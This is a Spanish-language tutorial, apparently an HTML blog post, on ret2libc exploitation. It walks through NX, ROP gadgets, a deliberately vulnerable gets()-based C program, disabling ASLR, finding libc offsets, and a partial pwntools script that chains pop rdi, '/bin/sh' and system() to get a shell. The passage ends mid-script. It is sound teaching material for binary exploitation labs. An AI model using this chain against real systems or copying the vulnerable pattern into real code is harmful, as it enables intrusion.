-&lt;p&gt;Es una tecnica para ejecutar codigo en la memoria apuntando a funciones de la libreria libc, por ejemplo, cuando se hace un programa en C con las funciones system, printf, put, esas funciones se compilan en un archivo de la libreria libc, entonces tenemos que apuntar a funciones de esa libreria&lt;/p&gt;
-
-&lt;h3 id=&quot;por-que-usamos-ret2libc&quot;&gt;¿Por que usamos ret2libc?&lt;/h3&gt;
-
-&lt;p&gt;Esta tecnica la usamos cuando con el RIP o EIP no podemos a apuntar a una direccion arbitraria para ejecutar una shellcode, esto occurre ya que tiene el NX activado.&lt;/p&gt;
-
-&lt;p&gt;Como vemos al parecer esta tecnica es similar a un bof stack-based comun, pero en vez de cambiar el RIP por una direccion que apunte a nuestra shellcode, lo que estamos haciendo es que apunte a direcciones de la libreria libc, mas adelante explicare nuestro payload y el por que.&lt;/p&gt;
-
-&lt;h2 id=&quot;no-executable-nx&quot;&gt;No Executable (NX)&lt;/h2&gt;
-
-&lt;p&gt;El NX o No executable, lo que hace es marcar el stack como no ejecutable, es decir que ahora en el stack nuestras entradas no se pueden ejecutar como codigo osea una shellcode, entonces si tomamos el control del RIP no vamos a poder redirigir el flujo del programa al RSP.&lt;/p&gt;
-
-&lt;h2 id=&quot;un-poco-de-return-oriented-programming-rop&quot;&gt;Un poco de Return Oriented Programming (ROP)&lt;/h2&gt;
-
-&lt;h3 id=&quot;que-es-rop&quot;&gt;¿Que es ROP?&lt;/h3&gt;
-
-&lt;p&gt;Es una tecnica usada para utilizar pequeñas secuencias de intrucciones llamados gadgets con el fin de ejecutar operaciones arbitrarias, esto funciona ya que obtenermos el control de call stack para secuestrar el flujo del programa y luego ejecutar los gadgets&lt;/p&gt;
-
-&lt;h3 id=&quot;gadgets&quot;&gt;Gadgets&lt;/h3&gt;
-
-&lt;p&gt;Son las secuencias de instrucciones que terminan con la intruccion ret, el gadget que vamos a usar es este: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi; ret&lt;/code&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;analizando-el-binario&quot;&gt;Analizando el binario&lt;/h2&gt;
-
-&lt;p&gt;&lt;strong&gt;Compilacion:&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gcc -no-pie -fno-stack-protector ret2libc.c -o ret2libc&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&amp;lt;stdio.h&amp;gt;
-#include&amp;lt;string.h&amp;gt;
-&lt;/span&gt;
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-
-&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]){&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Input: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
-        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Como vemos nuestro binario solo tiene la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; que esta imprimiendo un input y llamando a la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln&lt;/code&gt; y en esa funcion tenemos un buffer de 64 declarado como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;char buffer[64];&lt;/code&gt; y para obtener los datos del input se esta usando la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets&lt;/code&gt; y los guarda en el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buffer&lt;/code&gt;,  es bastante explicita la parte que es vulnerable del programa pero aun asi la explicare&lt;/p&gt;
-
-&lt;p&gt;El programa es vulnerable por que se esta usando la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets&lt;/code&gt;y esto es por que esa funcion no le importa cuantos datos le mandemos aun asi los guardara, es decir que si tenemos un buffer de 64 y a travez de la funcion gets le mandamos 100, esos 100 aun asi los guardara, de hecho podemos ver la manpage de gets con este comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;man 3 gets&lt;/code&gt; y bajando a la seccion de bugs nos dice algo como esto:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;BUGS
-       Never use gets().  Because it is impossible to tell without knowing the data in advance how many characters gets()  will  read,  and
-       because  gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use.  It has been used to
-       break computer security.  Use fgets() instead.
-
-       For more information, see CWE-242 (aka &quot;Use of Inherently Dangerous Function&quot;) at http://cwe.mitre.org/data/definitions/242.html
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;checksec&lt;/code&gt; vamos a ver las protecciones del binario y nos debe de salir algo asi&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[*] '/home/omarh/Documentos/ExplotacionBinaria/ret2libC/ret2libc'
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x400000)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Como vemos tiene la proteccion NX activada, asi que no podemos ejecutar codigo en el stack.&lt;/p&gt;
-
-&lt;h2 id=&quot;explicando-el-payload-que-usaremos&quot;&gt;Explicando el payload que usaremos&lt;/h2&gt;
-
-&lt;p&gt;Nuestro payload es el siguiente:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;|------|-----|--------------|---------|----------|
-| junk | ret | pop rdi; ret | /bin/sh | system() |
-|------|-----|--------------|---------|----------|
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Junk: esto es para llenar el buffer de 64 que tenemos&lt;/li&gt;
-  &lt;li&gt;ret: Direccion de ret, en otros casos esto no es necesario sin embargo esta vez lo usaremos por cuestiones de stack alignment&lt;/li&gt;
-  &lt;li&gt;pop rdi; ret, ok esto es nuestro gadget y lo usaremos ya que esto nos va a servir para meter cualquier cosa al registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RDI&lt;/code&gt; y tomando en cuenta las calling conventions el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RDI&lt;/code&gt; es el primero que se manda como argumento, lo que meteremos a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt; es la direccion de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; que tambien va a ser lo que le pasaremos a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; para que ejecute&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Explicare mas a detalle como funciona lo de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi; ret&lt;/code&gt;, imaginemos que queremos usar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi; ret&lt;/code&gt; para ingresar a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt; el valor de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x10&lt;/code&gt; y luego saltar a una funcion llamada &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;funcion1&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;A tomar en cuenta:&lt;/strong&gt;
-Cuando se sobreescribe el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RET&lt;/code&gt; tambien se sobreescribe el valor al que apunta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSP&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Entonces ahora si empezamos, tenemos lo siguiente:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;|--------------|
-|     junk     |
-|--------------|
-| pop rdi; ret | --&amp;gt; Direccion de pop rdi; ret
-|--------------|
-|     0x10     | --&amp;gt; El valor que meteremos a rdi
-|--------------|
-|   funcion1   |
-|--------------|
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Ahora sobreescribimos el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RIP&lt;/code&gt; por la direccion de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt;, entonces &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSP&lt;/code&gt; se mueve a la direccion de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi; ret&lt;/code&gt;, lo que pasaria seria algo com esto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret rip rsp&lt;/code&gt; y nuestro layout queda asi&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;|--------------|                            gadget
-|     junk     |                         |---------|  
-|--------------|                         |   ret   |  &amp;lt;---- RIP
-| pop rdi; ret | --&amp;gt; RSP apunta aca      |---------|
-|--------------|
-|     0x10     |
-|--------------|
-|   funcion1   |
-|--------------|
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSP&lt;/code&gt; apuntara a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x10&lt;/code&gt; y nuestro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RIP&lt;/code&gt; ahora apunta a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POP RDI&lt;/code&gt;, entonces ahora si &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x10&lt;/code&gt; se movera a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt;, el layot queda asi&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;|--------------|                              Gadget
-|     junk     |                            |---------|
-|--------------|                    RIP --&amp;gt; | pop rdi |
-| pop rdi; ret |                            |---------|
-|--------------|                            |   ret   |
-|     0x10     | --&amp;gt; RSP apunta aca         |---------|
-|--------------|
-|   funcion1   |
-|--------------|
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Y bueno ahora &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSP&lt;/code&gt; pasara  los siguientes elementos del stack ejecutando la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;funcion1&lt;/code&gt; y el layout queda asi&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;|--------------|
-|     junk     |
-|--------------|
-| pop rdi; ret | 
-|--------------|
-|     0x10     |
-|--------------|
-|   funcion1   | --&amp;gt; RSP apunta aca
-|--------------|
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Dejemos este ejemplo de lado y ahora pasaremos a ver como queda el layout tomando en cuenta nuestro payload&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  layout normal        layout modificado
-|---------------|      |--------------| 
-|    funcion    | --&amp;gt;  |    system()  | --&amp;gt; direccion de system
-|---------------|      |--------------|
-|   parametros  | --&amp;gt;  |    /bin/sh   | --&amp;gt; direccion de /bin/sh
-|---------------|      |--------------|
-|      RET      | --&amp;gt;  | pop rdi; ret | --&amp;gt; direccion de pop rdi; ret
-|---------------|      |--------------|
-|      RBP      | --&amp;gt;  |      ret     | --&amp;gt; direccion de ret
-|---------------|      |--------------|
-|     buffer    | --&amp;gt;  |     junk     | --&amp;gt; caracteres para llenar el buffer
-|---------------|      |--------------|
-|               |      |              |
-|---------------|      |--------------|
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Y ahora si que ya se explico esto ya podemos empezar a sacar todo lo que necesitamos&lt;/p&gt;
-
-&lt;h2 id=&quot;desbordando-el-buffer-y-calculando-el-offset-del-rip&quot;&gt;Desbordando el buffer y calculando el offset del RIP&lt;/h2&gt;
-
-&lt;p&gt;&lt;strong&gt;Ya no profundizare mucho en esto ya que esta el post de BoF stack-based donde si lo hago&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Para esta practica desactivaremos el ASRL con este comando:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo 0 | sudo tee /proc/sys/kernel/randomize_va_space 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Comenzaremos a debuggear el programa con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb -q ./ret2libc&lt;/code&gt; , en mi caso usare gdb con gef, te dejo el link del repo de gef por si lo quieres instalar&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://github.com/hugsy/gef.git
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Gef tiene un comando que se llama &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pattern create&lt;/code&gt; para generar una serie de caracteres que nos ayudaran a calcular los offsets, asi que le pasaremos ese comando de esta manera &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pattern create 100&lt;/code&gt; y nos generara 100 caracteres, ahora ejecutaremos el binario pasandole esos 100 caracteres como input, si mostramos el stack frame con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;i f&lt;/code&gt; vemos como nuestro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;saved rip&lt;/code&gt; tiene esto: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;saved rip = 0x616161616161616a&lt;/code&gt; ,estos son una serie de caracteres que fueron tomados de la cadena que generamos.&lt;/p&gt;
-
-&lt;p&gt;Ahora usaremos otro comando que tiene gef que se llama &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;patter offset&lt;/code&gt; para calcular el offset del RIP, ingresamos lo siguiente&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;patter offset 0x616161616161616a
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Esto nos debe de dar algo como esto&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[+] Searching for '0x616161616161616a'
-[+] Found at offset 72 (little-endian search) likely
-[+] Found at offset 65 (big-endian search) 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Para esta practica usaremos el offset 72 que corresponde a little-endian&lt;/p&gt;
-
-&lt;h2 id=&quot;consiguiendo-la-direccion-de-libc&quot;&gt;Consiguiendo la direccion de libc&lt;/h2&gt;
-
-&lt;p&gt;Ahora pasaremos a conseguir la direccion de libc ya que esto nos ayudara a conseguir la direccion real de los offsets de ret, pop rdi; ret, /bin/sh y system()&lt;/p&gt;
-
-&lt;p&gt;Para eso podemos usar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;info proc mappings&lt;/code&gt; el cual nos mostrara todas las regiones de la memoria mapeadas&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/ret2libc/libc.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos como la direccion que tengo seleccionada es la direccion del comienzo de la libreria libc y esa es la que usaremos.&lt;/p&gt;
-
-&lt;h3 id=&quot;usando-el-comando-ldd&quot;&gt;Usando el comando ldd&lt;/h3&gt;
-
-&lt;p&gt;Tambien podemos sacar la direccion de libc usando el comando ldd pasandole como argumento nuestro binario, asi que el comando queda asi &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldd ret2libc&lt;/code&gt;, esto nos da como resultado lo siguiente&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	linux-vdso.so.1 (0x00007ffff7fc4000)
-	libc.so.6 =&amp;gt; /usr/lib/libc.so.6 (0x00007ffff7c00000) --&amp;gt; Esta es la direccion de libc
-	/lib64/ld-linux-x86-64.so.2 =&amp;gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007ffff7fc6000)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;La direccion que corresponde a libc la indique con una flecha, y esa direccion es la misma que la que sacamos con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;info proc mappings&lt;/code&gt; simplemente con unos 0 demas (podemos usar la que sea de las 2).&lt;/p&gt;
-
-&lt;h2 id=&quot;consiguiendo-los-offset-de-ret-pop-rdi-ret-binsh-y-system&quot;&gt;Consiguiendo los offset de RET, POP RDI RET, /bin/sh y system()&lt;/h2&gt;
-
-&lt;p&gt;Ahora viene la parte de sacar los offsets de RET, POP RDI RET, /bin/sh y system()&lt;/p&gt;
-
-&lt;h3 id=&quot;offset-de-ret&quot;&gt;Offset de RET&lt;/h3&gt;
-
-&lt;p&gt;Para sacar el offset de ret usare una herramienta llamada &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ropper&lt;/code&gt;, les dejo el gitub de su repo para que la instalen &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://github.com/sashs/Ropper.git&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Pondremos este comando para conseguir el offset de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt;&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ropper --file /usr/lib/libc.so.6 --search &quot;ret&quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Tenemos que indicar la ruta de la libreria libc la cual la podemos ver tambien cuando ingresamos el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldd ret2libc&lt;/code&gt; y depues usamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--search&lt;/code&gt; para buscar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt; y si ejecutamos nos sale algo como esto:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/ret2libc/ret.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Debemos de selecionar el offset en el cual solo tenga la cadena &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret:&lt;/code&gt;, en mi caso yo seleccione esa que esta seleccionada en la imagen, entonces el offset es esto&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x0000000000102ea4
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h3 id=&quot;offset-de-pop-rdi-ret&quot;&gt;Offset de pop rdi; ret&lt;/h3&gt;
-
-&lt;p&gt;Para sacar el offset de pop rdi; ret usamos el mismo comando solo que al final en lo que queremos buscar le cambiamos a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi&lt;/code&gt; y queda asi&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ropper --file /usr/lib/libc.so.6 --search &quot;pop rdi&quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Esto nos imprime lo siguiente&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/ret2libc/poprdi.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Y de nuevo, seleccionare el que muestro ahi en pantalla, asi que el offset es:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x0000000000029835
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;offset-de-binsh&quot;&gt;Offset de /bin/sh&lt;/h3&gt;
-
-&lt;p&gt;Para sacar el offset de /bin/sh usaremos el comando strings para buscar en el archivo de libc la cadena &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; , el comando queda asi&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;strings -a -t x /usr/lib/libc.so.6 | grep &quot;/bin/sh&quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Esto nos da como resultado: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1bb26a /bin/sh&lt;/code&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;offset-de-system&quot;&gt;Offset de system()&lt;/h3&gt;
-
-&lt;p&gt;Usare el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readelf&lt;/code&gt; para buscar por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; en el archivo de la libreria libc y el comando queda asi:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;readelf -s libc.so.6 | grep system
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Esto nos imprime:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1481: 000000000004ba40    45 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.2.5
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Donde el offset es: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;000000000004ba40&lt;/code&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;creando-nuestro-exploit-y-ejecutandolo&quot;&gt;Creando nuestro exploit y ejecutandolo&lt;/h2&gt;
-
-&lt;p&gt;Ya que tenemos todos los offset solo tenemos que armar todo y el exploit queda asi&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./ret2libc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
-
-&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7ffff7c00000&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;pop_rdi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000000029835&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;bin_sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1bb26a&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x000000000004ba40&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000000102ea4&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pop_rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
